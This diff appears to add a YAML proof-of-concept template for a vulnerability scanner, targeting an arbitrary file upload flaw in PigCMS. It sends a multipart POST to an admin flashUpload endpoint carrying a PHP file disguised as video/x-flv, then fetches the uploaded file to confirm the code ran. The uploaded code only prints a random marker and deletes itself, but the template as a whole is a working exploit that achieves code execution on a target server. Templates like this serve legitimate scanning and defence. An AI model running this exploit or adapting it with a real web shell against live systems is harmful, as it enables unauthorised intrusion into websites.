@@ -1,0 +1,42 @@
+name: yaml-poc-pigcms-pigcms-file_upload-CT-416592
+binding: 114d5fde-00fa-4293-9067-61efc689db0e
+detail:
+    author: h1ei1
+    vulnerability:
+        id: 6bb173d6-ac4e-4340-96d5-f2d1e4a67320
+        level: critical
+    warning: File Upload (Auto Clear)
+transport: http
+set:
+    r1: randomLowercase(20)
+    r2: randomLowercase(20)
+    rboundary: randomLowercase(8)
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /cms/manage/admin.php?&m=manage&c=background&a=action_flashUpload
+            headers:
+                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+            body: |-
+                ------WebKitFormBoundary{{rboundary}}
+                Content-Disposition: form-data; name="filePath"; filename="{{r1}}.php"
+                Content-Type: video/x-flv
+
+                <?php echo "{{r2}}";unlink(__FILE__);?>
+                ------WebKitFormBoundary{{rboundary}}--
+            follow_redirects: false
+        expression: '"MAIN_URL_ROOT/.*?php".matches(response.body_string)'
+        output:
+            search: |
+                "MAIN_URL_ROOT/(?P<filename>.*?).php".bsubmatch(response.body)
+            uploadfilename: search["filename"]
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /cms/{{uploadfilename}}.php
+            follow_redirects: false
+        expression: response.status == 200 && response.body_string.contains(r2)
+expression: r0() && r1()
